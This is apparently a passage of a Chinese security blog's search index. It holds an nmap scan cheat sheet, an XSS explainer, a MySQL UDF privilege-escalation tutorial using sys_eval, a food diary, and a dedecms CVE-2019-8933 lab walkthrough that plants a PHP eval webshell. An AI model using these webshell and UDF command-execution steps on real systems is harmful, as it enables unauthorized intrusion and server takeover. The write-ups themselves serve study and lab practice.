<p>  <strong>Regular scan                  nmap <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>  <strong>Slow comprehensive scan       nmap -sS -sU -T4 -A -v -PE -PP -PS80,443 -PA3389 -PU40125 -PY -g 53 --script &quot;default or (discovery and safe)&quot; <a class="link"   href="http://www.baidu.com/" >www.baidu.com<i class="fas fa-external-link-alt"></i></a></strong></p>
<p>​                     </p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><h4 id="Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。"><a href="#Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。" class="headerlink" title="Nmap是一个很好的网络探测和安全审核的工具，Nmap可以用于扫描互联网上大规模的计算机。"></a><strong>Nmap是一个很好的网络探测和安全审核的工具</strong>，<strong>Nmap可以用于扫描互联网上大规模的计算机。</strong></h4><h4 id="支持操作系统：Windows-Linux-Unix-MacOS等等；源码开放，方便移植。"><a href="#支持操作系统：Windows-Linux-Unix-MacOS等等；源码开放，方便移植。" class="headerlink" title="支持操作系统：Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS等等；源码开放，方便移植。"></a><strong>支持操作系统：Windows&#x2F;Linux&#x2F;Unix&#x2F;MacOS等等；源码开放，方便移植。</strong></h4><h4 id="目前Nmap已经被成千上万的安全专家列为必备的工具之一。"><a href="#目前Nmap已经被成千上万的安全专家列为必备的工具之一。" class="headerlink" title="目前Nmap已经被成千上万的安全专家列为必备的工具之一。"></a><strong>目前Nmap已经被成千上万的安全专家列为必备的工具之一。</strong></h4><h4 id="希望这篇文章对大家能够起到帮助！"><a href="#希望这篇文章对大家能够起到帮助！" class="headerlink" title="希望这篇文章对大家能够起到帮助！"></a><strong>希望这篇文章对大家能够起到帮助！</strong></h4>]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>XSS漏洞详解</title>
    <url>/2023/08/11/XSS%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h3 id="一、XSS漏洞原理"><a href="#一、XSS漏洞原理" class="headerlink" title="一、XSS漏洞原理"></a><strong>一、XSS漏洞原理</strong></h3><p>XSS，即跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码，少数情况下还有ActionScript、VBScript等语言），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行该恶意代码，从而达到攻击的目的。</p>
<p>当应用程序没有对用户提交的内容进行验证和重新编码，而是直接呈现给网站的访问者时，就可能会触发XSS攻击。</p>
<h3 id="二、XSS漏洞的危害"><a href="#二、XSS漏洞的危害" class="headerlink" title="二、XSS漏洞的危害"></a><strong>二、XSS漏洞的危害</strong></h3><p>（1）窃取管理员帐号或Cookie。入侵者可以冒充管理员的身份登录后台，使得入侵者具有恶意操纵后台数据的能力，包括读取、更改、添加、删除一些信息。<br>（2）窃取用户的个人信息或者登录帐号，对网站的用户安全产生巨大的威胁。例如冒充用户身份进行各种操作。<br>（3）网站挂马。先将恶意攻击代码嵌入到Web应用程序之中。当用户浏览该挂马页面时，用户的计算机会被植入木马。<br>（4）发送广告或者垃圾信息。攻击者可以利用XSS漏洞植入广告，或者发送垃圾信息，严重影响到用户的正常使用。</p>
<h3 id="三、XSS漏洞的分类"><a href="#三、XSS漏洞的分类" class="headerlink" title="三、XSS漏洞的分类"></a>三、XSS漏洞的分类</h3><h5 id="1、反射型XSS"><a href="#1、反射型XSS" class="headerlink" title="1、反射型XSS"></a>1、反射型XSS</h5><p>反射型XSS，也称为非持久性XSS，是最常见的一种XSS。</p>
<p>XSS代码常常出现在URL请求中，当用户访问带有XSS代码的URL请求时，服务器端接收请求并处理，然后将带有XSS代码的数据返回给浏览器，浏览器解析该段带有XSS代码的数据并执行，整个过程就像一次反射，故称为反射型XSS。</p>
<p>该类攻击的主要特点是它的及时性和一次性，即用户提交请求后，响应信息会立即反馈给用户。该类攻击常发生在搜索引擎、错误提示页面等对用户的输入做出直接反应的场景中。</p>
<h5 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h5><p>存储型XSS，也称为持久性XSS。</p>
<p>在存储型XSS中，XSS代码被存储到服务器端，因此允许用户存储数据到服务器端的Web应用程序可能存在该类型XSS漏洞。攻击者提交一段XSS代码后，服务器接收并存储，当其他用户访问包含该XSS代码的页面时，XSS代码被浏览器解析并执行。</p>
<p>存储型XSS攻击的特点之一是提交的恶意内容会被永久存储，因而一个单独的恶意代码就会使多个用户受害，故被称为持久性XSS，它也是跨站脚本攻击中危害最的一类。二是被存储的用户提交的恶意内容不一定被页面使用，因此存在危险的响应信息不一定被立即返回，也许在访问那些在时间上和空间上没有直接关联的页面时才会引发攻击，因此存在不确定性和更好的隐蔽性。</p>
<p>这类攻击的一个典型场景是留言板、博客和论坛等，当恶意用户在某论坛页面发布含有恶意的Javascript代码的留言时，论坛会将该用户的留言内容保存在数据库或文件中并作为页面内容的一部分显示出来。当其他用户查看该恶意用户的留言时，恶意用户提交的恶意代码就会在用户浏览器中解析并执行。</p>
<h5 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h5><p>DOM (Document Objet Model)指文档对象模型。</p>
<p>DOM常用来表示在HTML和XML中的对象。DOM可以允许程序动态的访问和更新文档的内容、结构等。客户端JavaScript可以访问浏览器的文档对象模型。也就是说，通过JavaScript代码控制DOM节点就可以不经过服务器端的参与重构HTML页面。</p>
<p>该类攻击是反射型XSS的变种。它通常是由于客户端接收到的脚本代码存在逻辑错误或者使用不当导致的。比如Javascript代码不正确地使用各种DOM方法(如document.write)和Javascript内部函数(如eval函数)，动态拼接HTML代码和脚本代码就容易引发DOM型的跨站脚本攻击。</p>
<p>因此，DOM型XSS与前面两种XSS的区别就在于DOM型XSS攻击的代码不需要与服务器端进行交互，DOM型XSS的触发基于浏览器端对DOM数据的解析来完成，也就是完全是客户端的事情。</p>
<p>4、判断是哪一种XSS<br>发送一次带XSS代码的请求，若只能在当前返回的数据包里发现XSS代码，则是反射型；若以后这个页面的返回包里都会有XSS代码，则是存储型；若在返回包里找不到XSS代码，则是DOM型。</p>
<h3 id="四、XSS漏洞的检测与防御"><a href="#四、XSS漏洞的检测与防御" class="headerlink" title="四、XSS漏洞的检测与防御"></a>四、XSS漏洞的检测与防御</h3><h5 id="1、检测"><a href="#1、检测" class="headerlink" title="1、检测"></a>1、检测</h5><p>手工检测<br>手工检测重点要考虑数据输入的地方，且需要清楚输入的数据输出到什么地方。</p>
<p>在检测的开始，可以输入一些敏感字符，比如“&lt;、&gt;、（）”等，提交后查看网页源代码的变化以发现输入被输出到什么地方，且可以发现相关敏感字符是否被过滤。</p>
<p>手工检测结果相对准确，但效率较低。</p>
<p>工具检测<br>常用工具有AVWS（Acunetix Web Vulnerability Scanner）、BurpSuite等。还有一些专门针对XSS漏洞的检测工具，如：XSSer、XSSF（跨站脚本攻击框架）、BeEF(The Browser Exploitation Framework)等。</p>
<h5 id="2、防御"><a href="#2、防御" class="headerlink" title="2、防御"></a>2、防御</h5><p>●使用黑名单进行</p>
<p>●对HTML标签或特殊字符进行过滤</p>
<p>●使用内容安全的CSP</p>
<p>●使用设计上就会自动编码的框架，如：OWASP ESAPI、React JS、JSOUP等，对于JAVA而言，可以使用ESAPI.encoder().encodeForHTML()对字符串进行HTML编码。</p>
<p>●对于反射型和存储型XSS，可以在数据返回给客户端浏览器时，将敏感字符进行转义，如：将单引号进行编码替换（十进制编码’、十六进制编码’、HTML编码&amp;apos、Unicode编码\u0027等）。</p>
<p>●对于DOM型XSS，可以使用上下文敏感数据编码。如：在PHP中的htmlspecialchars（）、htmlentities（）函 数可以将一些预定义的字符转换为HTML实体，如：小于转化为&lt;、大于转化为&gt;、双引号转化为”、单引号转化为&amp;apos、与转化 为&amp;等。</p>
<p>●启用浏览器的HttpOnly特性可以组织客户端脚本访问cookie。如：在PHP中可以通过下面的代码设置cookie并启用HttpOnly。</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>UDF提权</title>
    <url>/2023/08/21/UDF%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h1>UFD提权</h1>

<p><strong>一、什么是udf</strong></p>
<p><strong>udf 全称为：user defined function，意为用户自定义函数；用户可以添加自定义的新函数到Mysql中，以达到功能的扩充，调用方式与一般系统自带的函数相同，例如 contact()，user()，version()等函数。</strong></p>
<p><strong>udf 文件后缀一般为 dll，由C、C++编写</strong></p>
<p><strong>二、udf在渗透中的作用</strong></p>
<p><strong>在一般渗透过程中，拿下一台windows服务器的webshell时，由于webshell权限较低，有些操作无法进行，而此时本地恰好存在mysql数据库，那么udf可能就派上用场了；由于windows安装的mysql进程一般都拥有管理员权限，这就意味着用户自定义的函数也拥有管理员权限，我们也就拥有了执行管理员命令的权限，这时新建管理员用户等操作也就轻而易举了，大多数人称为这一操作为udf提权，其实表达不够准确，应该称为通过mysql获得管理员权限。</strong></p>
<h1 id="三、利用条件"><a href="#三、利用条件" class="headerlink" title="三、利用条件"></a><strong>三、利用条件</strong></h1><p><strong>利用udf的条件其实还是挺苛刻的</strong></p>
<p><strong>mysql用户权限问题</strong></p>
<p><strong>获得一个数据库账号，拥有对MySQL的insert和delete权限。以root为佳。</strong></p>
<p><strong>拥有将udf.dll写入相应目录的权限。</strong></p>
<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="四、数据库版本问题"><a href="#四、数据库版本问题" class="headerlink" title="四、数据库版本问题"></a><strong>四、数据库版本问题</strong></h1><p><strong>udf利用的其中一步，是要将我们的xxx.dll文件上传到mysql检索目录中，mysql各版本的检索目录有所不同：</strong></p>
<p><strong>版本	路径</strong></p>
<p><strong>MySQL &lt; 5.0	导出路径随意；</strong></p>
<p><strong>5.0 &lt;&#x3D; MySQL&lt; 5.1	需要导出至目标服务器的系统目录（如：c:&#x2F;windows&#x2F;system32&#x2F;）</strong></p>
<p><strong>5.1 &lt; MySQL	必须导出到MySQL安装目录下的lib\plugin文件夹下</strong></p>
<p><strong>五、本地利用过程</strong></p>
<p><strong>1、获取Mysql安装路径</strong></p>
<p><strong>2、select @basedir</strong></p>
<p><strong>查看可操作路径</strong></p>
<p><strong>show global variables like “%secure%”</strong></p>
<p><strong>secure_file_priv值为null，表示mysql不允许导入导出，此时我们只能通过别的方法将udf.dll写入安装路径</strong></p>
<p><strong>3、查看plugin目录路径</strong></p>
<p><strong>select @@plugin_dir</strong></p>
<p><strong>4、将dll上传方式推荐几种</strong></p>
<p><strong>将dll上传到安装路径的方式：</strong></p>
<p><strong>通过webshell上传</strong></p>
<p><strong>以hex方式直接上传</strong></p>
<p><strong>sqlmap中现有的udf文件，分为32位和64位，一定要选择对版本，获取sqlmap的udf方式</strong></p>
<p><strong>5、sqlmap中udf获取方式</strong></p>
<p><strong>自动化注入工具Sqlmap已经集成了此功能。</strong></p>
<p><strong>在 \sqlmap\data\udf\mysql\windows\64目录下存放着lib_mysqludf_sys.dll_</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091127823.png"
                      alt="image-20230821091127823"
                ></p>
<p><strong>可以利用sqlmap 自带的解码工具cloak.py，在sqlmap\extra\cloak中打开命令行，来对lib_mysqludf_sys.dll_进行解码在，然后在直接利用，输入下面的</strong></p>
<p><strong>cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091153900.png"
                      alt="image-20230821091153900"
                ></p>
<p><strong>接着就会在\sqlmap\data\udf\mysql\windows\64目录下生成一个dll的文件lib_mysqludf_sys.dll，这个我们就可以直接拿来利用</strong></p>
<p><strong>攻击者可以利用lib_mysqludf_sys提供的函数执行系统命令。</strong></p>
<p><strong>函数：</strong></p>
<p><strong>sys_eval，执行任意命令，并将输出返回。</strong></p>
<p><strong>sys_exec，执行任意命令，并将退出码返回。</strong></p>
<p><strong>sys_get，获取一个环境变量。</strong></p>
<p><strong>sys_set，创建或修改一个环境变量。</strong></p>
<p><strong>以我windows系统为例，mysql版本为MySQL5.7.26</strong></p>
<p><strong>注意：攻击过程中，首先需要将lib_mysqludf_sys ( 目标为windows时，lib_mysqludf_sys.dll；linux时，lib_mysqludf_sys.so）上传到数据库能访问的路径下。</strong></p>
<p><strong>这里我改了个名字</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091217774.png"
                      alt="image-20230821091217774"
                ></p>
<p><strong>打开mysql执行以下语句：</strong></p>
<h5 id="create-function-sys-eval-returns-string-soname-udf-dll"><a href="#create-function-sys-eval-returns-string-soname-udf-dll" class="headerlink" title="create function sys_eval returns string soname &#39;udf.dll&#39;"></a><code>create function sys_eval returns string soname &#39;udf.dll&#39;</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091236187.png"
                      alt="image-20230821091236187"
                ></p>
<p><strong>执行成功，现在执行语句可查看ip</strong></p>
<h5 id="select-sys-eval-ipconfig"><a href="#select-sys-eval-ipconfig" class="headerlink" title="select sys_eval(&#39;ipconfig&#39;)"></a><code>select sys_eval(&#39;ipconfig&#39;)</code></h5><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091253240.png"
                      alt="image-20230821091253240"
                ></p>
<h1 id="六、实战情况"><a href="#六、实战情况" class="headerlink" title="六、实战情况"></a><strong>六、实战情况</strong></h1><p><strong>为了将这个转换为十六进制，可以借助mysql中的hex函数，先将udf.dll移动到C盘中，这样路径也清晰一些，然后执行下面命令</strong></p>
<p><code>select hex(load_file(&#39;C:/udf.dll&#39;)) into dumpfile &#39;c:/udf.txt&#39;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091323641.png"
                      alt="image-20230821091323641"
                ></p>
<p><strong>成功生成了十六进制形式流！</strong></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/UDF%E6%8F%90%E6%9D%83/image-20230821091338213.png"
                      alt="image-20230821091338213"
                ></p>
<p><strong>后面还有很多好玩的内容，大家可以自行去琢磨研究，感谢大家！</strong></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>吃货日记</title>
    <url>/2023/07/26/%E5%90%83%E8%B4%A7%E6%97%A5%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="我们的吃货日记"><a href="#我们的吃货日记" class="headerlink" title="我们的吃货日记"></a>我们的吃货日记</h1><p>​               </p>
<h4 id="赞不绝口的小龙虾"><a href="#赞不绝口的小龙虾" class="headerlink" title="赞不绝口的小龙虾"></a><div style="color: green">赞不绝口的小龙虾</div></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E5%90%83%E8%B4%A7%E6%97%A5%E8%AE%B0/%E5%90%83%E8%B4%A71.jpg"
                     
                ></p>
<p>​             </p>
<p>​                               </p>
<h4 id="物美价廉的榴莲"><a href="#物美价廉的榴莲" class="headerlink" title="物美价廉的榴莲"></a><strong><div style="color:red">物美价廉的榴莲</div></strong></h4><p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/%E5%90%83%E8%B4%A7%E6%97%A5%E8%AE%B0/%E5%90%83%E8%B4%A72.jpg"
                     
                ></p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>吃货日记</tag>
      </tags>
  </entry>
  <entry>
    <title>dedecms文件上传(CVE-2019-8933)漏洞复现</title>
    <url>/2023/08/24/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p><em><strong>1.第一步，打开环境，这里我用的是80：14882端口</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174353400.png"
                      alt="image-20230824174353400"
                ></p>
<p><em><strong>2.点击上传跳转页面</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174418389.png"
                      alt="image-20230824174418389"
                ></p>
<p><em><strong>3.在upload&#x2F;后写dede进入到该管理后台</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174441418.png"
                      alt="image-20230824174441418"
                ></p>
<p><em><strong>4.点击模板，进入到默认模板管理</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174503674.png"
                      alt="image-20230824174503674"
                ></p>
<p><em><strong>5.新建模板</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174518062.png"
                      alt="image-20230824174518062"
                ></p>
<p><em><strong>6.在后台输入一句话木马<?php eval($_POST[123]);?>点击保存</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174605190.png"
                      alt="image-20230824174605190"
                ></p>
<p><em><strong>7.生成-更新主页HTML-浏览选择新建的模板-更改后缀为php</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174619578.png"
                      alt="image-20230824174619578"
                ></p>
<p> <img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174632722.png"
                      alt="image-20230824174632722"
                ></p>
<p><em><strong>8.使用蚁剑连接<a class="link"   href="http://192.168.2.211:14882/uploads/index.php" >http://192.168.2.211:14882/uploads/index.php<i class="fas fa-external-link-alt"></i></a></strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174659762.png"
                      alt="image-20230824174659762"
                ></p>
<p><em><strong>9.连接成功！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174712986.png"
                      alt="image-20230824174712986"
                ></p>
<p><em><strong>10.成功在主目录下tmp文件夹中找到flag！</strong></em></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="/../images/dedecms%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0(CVE-2019-8933)%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20230824174729905.png"
                      alt="image-20230824174729905"
                ></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
</search>
